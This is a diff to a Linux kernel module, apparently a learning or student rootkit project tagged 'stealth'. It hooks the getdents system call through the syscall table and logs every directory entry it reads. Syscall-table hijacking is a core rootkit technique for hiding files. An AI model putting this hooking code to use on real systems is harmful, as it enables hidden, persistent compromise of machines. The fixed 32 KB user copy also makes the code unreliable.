@@ -11,6 +11,7 @@
 #include <linux/unistd.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
+#include <linux/dirent.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Josh & RJ");
@@ -18,21 +19,49 @@ MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
 MODULE_VERSION("0.1");
 
 #define SYS_CALL_TABLE "sys_call_table"
-#define SYSCALL_NI __NR_tuxcall
+//#define SYSCALL_NI __NR_tuxcall
+#define SYSCALL_NI __NR_getdents
 #define TAG "stealth"
 
 static ulong *syscall_table = NULL;
 static void *original_syscall = NULL;
-static char buffer[40];
+static char buffer[32768];
 
-static unsigned long lkm_syscall(const char *string)
+struct linux_dirent {
+    unsigned long d_ino;
+    unsigned long d_off;
+    unsigned short d_reclen;
+    char d_name[];
+};
+
+typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);
+
+static int lkm_syscall_getdents(unsigned int fd,
+        struct linux_dirent *dirp, unsigned int count)
 {
-    if (copy_from_user(buffer, string, 40)) {
+    int ret, offset;
+    struct linux_dirent *loc_dirp, *dir;
+    char *offset_buffer;
+
+    ret = ((getdents)original_syscall)(fd, dirp, count);
+
+    if (copy_from_user(buffer, dirp, 32768) != 0)
+    {
         return -EFAULT;
     }
-    buffer[39] = 0;
-    printk("Input address %s\n", buffer);
-    return 0;
+
+    offset = 0;
+    loc_dirp = (struct linux_dirent *)buffer;
+
+    while (offset < ret)
+    {
+        offset_buffer = ((char*)loc_dirp) + offset;
+        dir = (struct linux_dirent *)offset_buffer;
+        printk("%s: local_dirp[i] = %s\n", TAG, dir->d_name);
+        offset += dir->d_reclen;
+    }
+
+    return ret;
 }
 
 static int is_syscall_table(ulong *p)
